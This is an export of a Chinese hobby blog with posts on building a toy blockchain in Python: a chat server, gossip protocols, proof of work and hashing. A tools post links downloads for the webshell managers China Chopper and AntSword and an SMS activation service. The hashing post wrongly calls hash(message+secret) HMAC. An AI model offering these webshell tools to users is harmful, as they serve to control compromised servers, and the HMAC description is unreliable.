class="line">        message += <span class="string">&quot;Currently connected users:&quot;</span></span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> self.connection_pool:</span><br><span class="line">            <span class="keyword">if</span> user == writer:</span><br><span class="line">                message += <span class="string">f&quot;\n - <span class="subst">&#123;user.nickname&#125;</span> (you)&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                message += <span class="string">f&quot;\n - <span class="subst">&#123;user.nickname&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">        message += <span class="string">&quot;\n===&quot;</span></span><br><span class="line">        writer.write(<span class="string">f&quot;<span class="subst">&#123;message&#125;</span>\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_new_user_to_pool</span>(<span class="params">self, writer</span>):</span><br><span class="line">        self.connection_pool.add(writer)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">remove_user_from_pool</span>(<span class="params">self, writer</span>):</span><br><span class="line">        self.connection_pool.remove(writer)</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handle_connection</span>(<span class="params">reader, writer</span>):</span><br><span class="line">    <span class="comment"># Get a nickname for the new client</span></span><br><span class="line">    writer.write(<span class="string">&quot;&gt; Choose your nickname: &quot;</span>.encode())</span><br><span class="line">    response = <span class="keyword">await</span> reader.readuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    writer.nickname = response.decode().strip()</span><br><span class="line"> </span><br><span class="line">    connection_pool.add_new_user_to_pool(writer)</span><br><span class="line">    connection_pool.send_welcome_message(writer)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Announce the arrival of this new user</span></span><br><span class="line">    connection_pool.broadcast_user_join(writer)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="keyword">await</span> reader.readuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> asyncio.exceptions.IncompleteReadError:</span><br><span class="line">            connection_pool.broadcast_user_quit(writer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        message = data.decode().strip()</span><br><span class="line">        <span class="keyword">if</span> message == <span class="string">&quot;/quit&quot;</span>:</span><br><span class="line">            connection_pool.broadcast_user_quit(writer)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> message == <span class="string">&quot;/list&quot;</span>:</span><br><span class="line">            connection_pool.list_users(writer)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            connection_pool.broadcast_new_message(writer, message)</span><br><span class="line">        <span class="keyword">await</span> writer.drain()</span><br><span class="line">        <span class="keyword">if</span> writer.is_closing():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    writer.close()</span><br><span class="line">    <span class="keyword">await</span> writer.wait_closed()</span><br><span class="line">    connection_pool.remove_user_from_pool(writer)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    server = <span class="keyword">await</span> asyncio.start_server(handle_connection, <span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">8888</span>)</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> server:</span><br><span class="line">        <span class="keyword">await</span> server.serve_forever()</span><br><span class="line"></span><br><span class="line">connection_pool = ConnectionPool()</span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><img src="/2023/02/03/networking/image-20230206215812345.png" alt="image-20230206215812345"></p>
<h2 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h2><p>协议在p2p网络的设计中非常重要。协议是“游戏规则”，它们很难设计，因为它们需要长期的远见和规划。缺乏健全的架构会产生架构裂痕——这些问题需要所谓的“硬分叉”;或网络底层协议的更改。良好的规划为未来的影响留下了充足的空间，无论是技术进步还是网络的社会变革。</p>
<p>比特币成功的部分原因在于其协议的简单性以及其核心开发人员在进行新更改时的仔细考虑。协议层面的裂痕经常导致社区驱动的“硬分叉”，如比特币现金和比特币区块链的无数衍生分支，而因为它们几乎总是协议级别分歧的结果。</p>
<p>考虑到这一点，让我们看一下我们构建的聊天服务器，并通过查看可能的“消息”来剖析其协议。将这些分解为”user stories”有帮助：</p>
<ul>
<li>作为连接用户，我可以通过发送消息 /quit 退出。</li>
<li>作为连接用户，我可以通过发送消息 /list 列出所有连接的用户。</li>
<li>作为连接的用户，我发送的任何文本（不包括提到的消息）都会广播到所有连接的客户端。</li>
</ul>
<p>我们的玩具聊天服务器非常简单。但是通过定义前面的协议，<em>我们能够使其通用</em>;这是至关重要的，因为这意味着互联网上<em>的任何</em>客户端，使用他们自己的软件，只需要遵守协议就可以成功地与我们的服务器互动。</p>
<p>比特币维基：<a href="https://en.bitcoin.it/wiki/Protocol_documentation">https://en.bitcoin.it/wiki/Protocol_documentation</a></p>
<h2 id="构建区块链的基础"><a href="#构建区块链的基础" class="headerlink" title="构建区块链的基础"></a>构建区块链的基础</h2><p>点对点网络是由网络上的每个客户端共同实现确定的协议来实现的。</p>
<p>遵循建议，首先将网络分解为用户故事以帮助阐明需要哪些消息是有帮助的。定义<em>连接</em>节点的概念，以表示与足够多的其他对等体充分连接以形成网络的节点。以下是一些可能的故事：</p>
<ul>
<li>作为一个<em>节点</em>，我能够通过发现它们来连接到对等方*。</li>
<li>作为一个连接的节点，我可以向任何请求它们的<em>节点</em>发布我的对等方列表。</li>
<li>作为<em>连接的节点</em>，我能够接受和广播来自对等方的新事务。</li>
<li>作为一个<em>连接的节点</em>，我能够将块的内容服务器化给任何请求它的对等方。</li>
<li>作为一个<em>连接的节点</em>，如果它符合某些条件，我可以接受一个新块并将其添加到我的区块链中。</li>
</ul>
<h2 id="八卦协议"><a href="#八卦协议" class="headerlink" title="八卦协议"></a>八卦协议</h2><p><img src="/2023/02/03/networking/image-20230206221218058.png" alt="image-20230206221218058"></p>
<p>在上图中，节点 U 必须从 A 获取其他节点（对等节点）的列表，而 A 又从他的邻居 X、Y 和 Z 获取节点列表，并且必须不断“检测”它们，以确保它们在网络上仍然“活着”。还必须向网络宣布 U 的存在等等。这种通用方案称为八卦协议，成功的八卦协议是构成弹性、去中心化网络的原因。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title>工作证明</title>
    <url>/2023/02/02/%E5%B7%A5%E4%BD%9C%E8%AF%81%E6%98%8E/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>构建区块链的第三步——加入proof of work</p>
<span id="more"></span>
<h2 id="使用新的python解释器——ipython"><a href="#使用新的python解释器——ipython" class="headerlink" title="使用新的python解释器——ipython"></a>使用新的python解释器——ipython</h2><p>安装该解释器时，经常出现因网络速率慢而导致的报错，后来通过清华的镜像解决（清华yyds），更多实用工具见相关文章</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">pip install <span class="selector-attr">[需要安装的库]</span> -<span class="selector-tag">i</span> https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br></pre></td></tr></table></figure>
<p>调用解释器<br><img src="/2023/02/02/%E5%B7%A5%E4%BD%9C%E8%AF%81%E6%98%8E/image-20230202151633283.png" alt="image-20230202151633283"><br>构建区块链，建立创世区块<br><img src="/2023/02/02/%E5%B7%A5%E4%BD%9C%E8%AF%81%E6%98%8E/image-20230202151710123.png" alt="image-20230202151710123"><br>输入交易信息，创建新区块<br><img src="/2023/02/02/%E5%B7%A5%E4%BD%9C%E8%AF%81%E6%98%8E/image-20230202152123926.png" alt="image-20230202152123926"><br><img src="/2023/02/02/%E5%B7%A5%E4%BD%9C%E8%AF%81%E6%98%8E/image-20230202152135793.png" alt="image-20230202152135793"></p>
<h2 id="工作量证明"><a href="#工作量证明" class="headerlink" title="工作量证明"></a>工作量证明</h2><p>比特币和以太坊都是用工作量证明算法向其区块链添加新区块</p>
<h3 id="加入工作量证明算法的代码实现"><a href="#加入工作量证明算法的代码实现" class="headerlink" title="加入工作量证明算法的代码实现"></a>加入工作量证明算法的代码实现</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Blockchain</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.chain = []</span><br><span class="line">        self.pending_transactions = []</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;创建创世区块&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Creating genesis block&quot;</span>)</span><br><span class="line">        self.chain.append(self.new_block())</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_block</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;生成一个新区块并将其添加到链中&#x27;&#x27;&#x27;</span></span><br><span class="line">        block = &#123;</span><br><span class="line">            <span class="string">&#x27;index&#x27;</span>:<span class="built_in">len</span>(self.chain),</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>:datetime.utcnow().isoformat(),</span><br><span class="line">            <span class="string">&#x27;transactions&#x27;</span>:self.pending_transactions,</span><br><span class="line">            <span class="string">&#x27;previous_hash&#x27;</span>:self.last_block[<span class="string">&quot;hash&quot;</span>] <span class="keyword">if</span> self.last_block <span class="keyword">else</span> <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;nonce&#x27;</span>:<span class="built_in">format</span>(random.getrandbits(<span class="number">64</span>),<span class="string">&quot;x&quot;</span>),</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取新区块的hash值，并把hash值放入区块中&#x27;&#x27;&#x27;</span></span><br><span class="line">        block_hash = self.<span class="built_in">hash</span>(block)</span><br><span class="line">        block[<span class="string">&quot;hash&quot;</span>] = block_hash</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;重置待交易列表&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.pending_transactions = []</span><br><span class="line">        <span class="keyword">return</span> block</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">block</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;将python对象编码成Json字符串，sort_keys=True:是告诉编码器按照字典排序输出，否则可能出现不同的hash值&#x27;&#x27;&#x27;</span></span><br><span class="line">        block_string = json.dumps(block,sort_keys=<span class="literal">True</span>).encode()</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;digest：返回摘要，作为二进制数据字符串值</span></span><br><span class="line"><span class="string">        hexdigest：返回摘要，作为十六进制数据字符串值&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> sha256(block_string).hexdigest()</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">last_block</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回链中最后一个区块（如果有的话）&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.chain[-<span class="number">1</span>] <span class="keyword">if</span> self.chain <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">valid_block</span>(<span class="params">block</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;检查新区块的hash值是否完成difficult要求&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> block[<span class="string">&quot;hash&quot;</span>].startswith(<span class="string">&quot;00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">proof_of_work</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            new_block = self.new_block()</span><br><span class="line">            <span class="keyword">if</span> self.valid_block(new_block):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        self.chain.append(new_block)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found a new block:&quot;</span>,new_block)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_transaction</span>(<span class="params">self,sender,recipient,amount</span>):</span><br><span class="line">        self.pending_transactions.append(&#123;</span><br><span class="line">            <span class="string">&quot;recipient&quot;</span>:recipient,</span><br><span class="line">            <span class="string">&quot;sender&quot;</span>:sender,</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>:amount,</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="built_in">print</span>(self.pending_transactions)</span><br></pre></td></tr></table></figure>
<p>运行结果<br><img src="/2023/02/02/%E5%B7%A5%E4%BD%9C%E8%AF%81%E6%98%8E/image-20230202221017437.png" alt="image-20230202221017437"></p>
<p>代码中，有关于信息输入的代码，运行也不报错，但是总是调用失败，以后整明白了再回来改。大概是个这么个情况：<br><img src="/2023/02/02/%E5%B7%A5%E4%BD%9C%E8%AF%81%E6%98%8E/image-20230202221129627.png" alt="image-20230202221129627"></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title>实用工具</title>
    <url>/2023/02/02/%E4%BD%BF%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>搜罗到的一些好用的工具或者镜像辅助什么的</p>
<span id="more"></span>
<h2 id="镜像源"><a href="#镜像源" class="headerlink" title="镜像源"></a>镜像源</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">pip install <span class="selector-attr">[需要安装的库]</span> -<span class="selector-tag">i</span> https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="接码平台"><a href="#接码平台" class="headerlink" title="接码平台"></a>接码平台</h2><p><a href="https://smspva.com/">Account activations via SMS | Receive SMS online | Smspva</a></p>
<h2 id="dmg文件"><a href="#dmg文件" class="headerlink" title="dmg文件"></a>dmg文件</h2><p><a href="https://reincubate.com/dmg-extractor/">DMG Extractor: extract and read Mac DMG files on Windows (reincubate.com)</a></p>
<h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
<h2 id="剑蚁"><a href="#剑蚁" class="headerlink" title="剑蚁"></a>剑蚁</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
<h2 id="jsp阅读器"><a href="#jsp阅读器" class="headerlink" title="jsp阅读器"></a>jsp阅读器</h2><p><a href="https://github.com/gjy20001003/resourse">gjy20001003/resourse: 一些工具的存放地 (github.com)</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>blockchains</title>
    <url>/2023/02/02/blockchains/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>实现区块链的第二步——手动化区块链的代码实现</p>
<span id="more"></span>
<p>在python中，块是简单的python字典。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">block_1038 = &#123;</span><br><span class="line">    <span class="string">&#x27;index&#x27;</span>: <span class="number">1038</span>,</span><br><span class="line">    <span class="string">&#x27;timestamp&#x27;</span>: <span class="string">&quot;2020-02-25T08:07:42.170675&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&#x27;sender&#x27;</span>: <span class="string">&quot;bob&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;recipient&#x27;</span>: <span class="string">&quot;alice&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;amount&#x27;</span>: <span class="string">&quot;$5&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span>: <span class="string">&quot;83b2ac5b&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;previous_hash&#x27;</span>: <span class="string">&quot;2cf24ba5f&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到最后两个字段hash和previous_hash，即区块1038包含区块1037的hash，而区块1037包含这区块1036的hash，以此可以回到第一个区块——创世纪区块</p>
<p>一个区块可以包含<em>任何</em>数据：文件、图像、交易、记录等。在前面的示例中，我们的区块包含从 Bob 到 Alice 的一笔交易，价格为 5 美元。这个区块类似于大多数加密货币区块（如比特币）的样子。您可能听说过人们将以太坊描述为“世界计算机”。这是因为以太坊区块还包含<em>可执行代码</em>作为其数据的一部分，指示网络上的参与者在区块链本身上执行操作。</p>
<p>不可变性和hash的重要性</p>
<p>每个区块都包含着前一个区块的hash值，形成一条链。hash的这种特性链接赋予了区块链不变性和防欺诈特性。</p>
<p>更具体地说，previous_hash字段是块之间用于创建<em>链</em>的链接。如果攻击者以某种方式破坏了链中的较早块，则所有后续块都将发生变化，因为它们的哈希值将不正确。例如，如果我们必须修改块 #1037 中的单个数据，那么 #1037 的哈希值会有所不同，因此 #1038 中的previous_hash值会有所不同。<strong>因此，如果任何早期区块中的单个比特被篡改，则此后的整个区块链都将无效。</strong>这就是区块链的链性质——它们由使用previous_hash哈希链保护。</p>
<h2 id="手动化区块链的代码实现"><a href="#手动化区块链的代码实现" class="headerlink" title="手动化区块链的代码实现"></a>手动化区块链的代码实现</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Blockchain</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.chain = []</span><br><span class="line">        self.pending_transactions = []</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;创建创世区块&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Creating genesis block&quot;</span>)</span><br><span class="line">        self.new_block()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_block</span>(<span class="params">self,previous_hash=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;生成一个新区块并将其添加到链中&#x27;&#x27;&#x27;</span></span><br><span class="line">        block = &#123;</span><br><span class="line">            <span class="string">&#x27;index&#x27;</span>:<span class="built_in">len</span>(self.chain),</span><br><span class="line">            <span class="string">&#x27;timestamp&#x27;</span>:datetime.utcnow().isoformat(),</span><br><span class="line">            <span class="string">&#x27;transactions&#x27;</span>:self.pending_transactions,</span><br><span class="line">            <span class="string">&#x27;previous_hash&#x27;</span>:previous_hash,</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取新区块的hash值，并把hash值放入区块中&#x27;&#x27;&#x27;</span></span><br><span class="line">        block_hash = self.<span class="built_in">hash</span>(block)</span><br><span class="line">        block[<span class="string">&quot;hash&quot;</span>] = block_hash</span><br><span class="line">            </span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;重置待交易列表&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.pending_transactions = []</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;把区块添加到链中&#x27;&#x27;&#x27;</span></span><br><span class="line">        self.chain.append(block)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Create block <span class="subst">&#123;block[<span class="string">&#x27;index&#x27;</span>]&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> block</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">hash</span>(<span class="params">block</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;将python对象编码成Json字符串，sort_keys=True:是告诉编码器按照字典排序输出，否则可能出现不同的hash值&#x27;&#x27;&#x27;</span></span><br><span class="line">        block_string = json.dumps(block,sort_keys=<span class="literal">True</span>).encode()</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;digest：返回摘要，作为二进制数据字符串值</span></span><br><span class="line"><span class="string">        hexdigest：返回摘要，作为十六进制数据字符串值&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> sha256(block_string).hexdigest()</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">last_block</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;返回链中最后一个区块（如果有的话）&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> self.chain[-<span class="number">1</span>] <span class="keyword">if</span> self.chain <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">new_transaction</span>(<span class="params">self,sender,recipient,amount</span>):</span><br><span class="line">        self.pending_transactions.append(&#123;</span><br><span class="line">            <span class="string">&quot;recipient&quot;</span>:recipient,</span><br><span class="line">            <span class="string">&quot;sender&quot;</span>:sender,</span><br><span class="line">            <span class="string">&quot;amount&quot;</span>:amount,</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure>
<p>运行结果<br>初始化（创建创世区块）<br><img src="/2023/02/02/blockchains/image-20230202113544695.png" alt="image-20230202113544695"><br>手动添加交易<br>调用new_transaction函数<br><img src="/2023/02/02/blockchains/image-20230202113730398.png" alt="image-20230202113730398"><br>创建新区块，调用new_block函数，将上一个区块的hash填入新建区块的previous_hash中<br><img src="/2023/02/02/blockchains/image-20230202114848874.png" alt="image-20230202114848874"><br>输出现在的区块链<br><img src="/2023/02/02/blockchains/image-20230202114920312.png" alt="image-20230202114920312"></p>
<p>下一个目标实现自动化区块链</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链基础</title>
    <url>/2023/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>区块链的基础知识</p>
<span id="more"></span>
<h2 id="1-1-比特币内部结构"><a href="#1-1-比特币内部结构" class="headerlink" title="1.1 比特币内部结构"></a>1.1 比特币内部结构</h2><p><img src="/2023/02/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80/image-20230201154207914.png" alt="image-20230201154207914"></p>
<ul>
<li>previous hash(前一个区块的hash)</li>
<li>merkle root(默克尔树根节点,内部存储交易数据)</li>
<li>timestamp(当前区块生成的时间)</li>
<li>nonce(旷工计算hash值次数)</li>
</ul>
<h2 id="1-2-实现的区块链数据结构"><a href="#1-2-实现的区块链数据结构" class="headerlink" title="1.2 实现的区块链数据结构"></a>1.2 实现的区块链数据结构</h2><ul>
<li>index 当前第几个区块</li>
<li>timestamp 该区块创建时的时间戳</li>
<li>data 交易信息</li>
<li>previousHash 前一个区块的hash</li>
<li>hash 当前区块的hash</li>
</ul>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>hash</title>
    <url>/2023/02/01/hash/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学习区块链的第一步——认识哈希函数</p>
<span id="more"></span>
<p>从理论上讲，<strong>散列</strong>是识别数据的行为。这是一种为任何数据（句子、照片、电子表格或下载的程序）分配唯一随机值的特殊方法。您可以将哈希函数视为“识别机”，即为特定输入分配值的东西。输入是任意的 - 它可以是图像，文档，文件，原始字节，数字，以及您喜欢的任何内容 - 但<strong>对于相同的输入，输出始终是可预测</strong>的。</p>
<h2 id="python中的哈希"><a href="#python中的哈希" class="headerlink" title="python中的哈希"></a>python中的哈希</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment"># 哈希函数期望字节作为输出，所以使用encode()方法将字符串转换为字节</span></span><br><span class="line">input_bytes = <span class="string">b&quot;akali&quot;</span></span><br><span class="line">output = hashlib.sha256(input_bytes)</span><br><span class="line"><span class="comment"># 使用hexdigest():将字节转换为16进制</span></span><br><span class="line"><span class="built_in">print</span>(output.hexdigest())</span><br></pre></td></tr></table></figure>
<p>运行结果<img src="/2023/02/01/hash/image-20230201132147109.png" alt="image-20230201132147109"></p>
<p>将akali改为akall，可以看到两个hash值差别极大<img src="/2023/02/01/hash/image-20230201132244490.png" alt="image-20230201132244490"></p>
<p>所以，输入的微小变化会导致输出的大变化</p>
<p>通常，如果哈希函数满足以下属性，则将其视为<strong>加密函数</strong>：</p>
<ul>
<li><strong>确定性：</strong>相同的输入始终产生相同的哈希值。</li>
<li><strong>难治性：</strong>除非耗尽（尝试大量可能的输入），否则无法找到给定哈希的输入。</li>
<li><strong>碰撞安全：</strong>找到输出相同哈希的两个不同输入是不可行的。</li>
<li><strong>雪崩效应：</strong>输入中的最小变化应该产生一个如此不同的哈希，以至于新哈希看起来与旧哈希不相关。</li>
<li><strong>速度：</strong>生成哈希的计算<em>速度很快</em>。</li>
</ul>
<h4 id="哈希函数的选择"><a href="#哈希函数的选择" class="headerlink" title="哈希函数的选择"></a>哈希函数的选择</h4><p>点对点区块链在其协议中选择了哈希函数：比特币使用<em>双</em>sha256，而以太坊使用keccak256。要知道的重要一点是，所有这些哈希函数都做同样的事情：它们为给定的输入提供可预测的输出。</p>
<h2 id="对图像进行hash处理"><a href="#对图像进行hash处理" class="headerlink" title="对图像进行hash处理"></a>对图像进行hash处理</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;02.jpg&quot;</span>,<span class="string">&quot;rb&quot;</span>)  <span class="comment"># rb参数表示文件应处于只读模式，并作为字节读取</span></span><br><span class="line"><span class="built_in">hash</span> = sha256(file.read()).hexdigest()</span><br><span class="line">file.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;图片的hash值为：<span class="subst">&#123;<span class="built_in">hash</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="/2023/02/01/hash/image-20230201132523953.png" alt="image-20230201132523953"></p>
<h3 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h3><p>可以用于验证从互联网下载的文件是否被第三方篡改，信誉良好的网站会宣传文件的哈希值（有时称为校验和）应该是什么，以便在本地验证。</p>
<h3 id="密码学思考"><a href="#密码学思考" class="headerlink" title="密码学思考"></a>密码学思考</h3><p>爱丽丝想要 通过不安全的渠道（如开放的互联网）向 Bob 发送电子邮件。鲍勃对其他人是否可以阅读电子邮件不感兴趣，但他希望确保它没有被篡改。Bob 如何验证电子邮件是否未被篡改？</p>
<p>解决方案：HMAC（哈希消息身份验证代码）的协议</p>
<ol>
<li>爱丽丝和鲍勃都有一个秘密短语S。</li>
<li>然后，Alice 创建消息 M 的哈希 H，并将机密附加到消息末尾：H = 哈希（M + S）。</li>
<li>Alice 将 H 和 M 发送给 Bob（消息和计算的哈希）。</li>
<li>Bob 通过自己计算 H 来检查消息完整性，以查看它是否与 Alice 宣传的哈希值相同 .</li>
</ol>
<h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><ul>
<li>Alice和Bob拥有一个共同密钥为akali，记为S</li>
<li>Alice给Bob发送一个信息内容为“龟龟，云路亡我”，记为M</li>
<li>Alice计算H=hash(M+S)，并将H和M发送给Bob</li>
<li>Bob通过以下代码来对照hash值</li>
</ul>
<p>Alice加密过程<br><img src="/2023/02/01/hash/image-20230201150843340.png" alt="image-20230201150843340"><br>将”龟龟，云路亡我“和得到的hash值发送给Bob</p>
